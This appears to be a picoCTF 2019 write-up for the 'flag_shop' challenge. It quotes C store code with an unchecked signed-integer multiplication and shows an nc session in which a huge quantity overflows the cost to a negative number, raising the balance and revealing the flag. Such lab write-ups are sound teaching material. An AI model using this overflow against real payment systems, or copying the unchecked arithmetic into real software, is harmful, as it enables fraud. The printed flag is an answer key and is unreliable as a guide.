# flag_shop

## Question
There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 3967.

## Solution
From the file `store.c`:
```C
int number_flags = 0;
fflush(stdin);
scanf("%d", &number_flags);
if(number_flags > 0){
int total_cost = 0;
total_cost = 900*number_flags;
printf("\nThe final cost is: %d\n", total_cost);
if(total_cost <= account_balance){
    account_balance = account_balance - total_cost;
    printf("\nYour current balance after transaction: %d\n\n", account_balance);
}
else{
    printf("Not enough funds to complete purchase\n");
}
```

Potentially, we can make total_cost [overflow](https://en.wikipedia.org/wiki/Integer_overflow) since can can control number_flags. The size of a int is 4 bytes which is 32 bits and when it exceed the range it would . 
```python
>>> 2**32 // 900
4772185
```

Lets try it now:
```bash
user@PC:~$ nc 2019shell1.picoctf.com 3967
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
4772000

The final cost is: -167296

Your current balance after transaction: 168396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
1
YOUR FLAG IS: picoCTF{m0n3y_bag5_cd0ead78}
```

Flag: `picoCTF{m0n3y_bag5_cd0ead78}`
    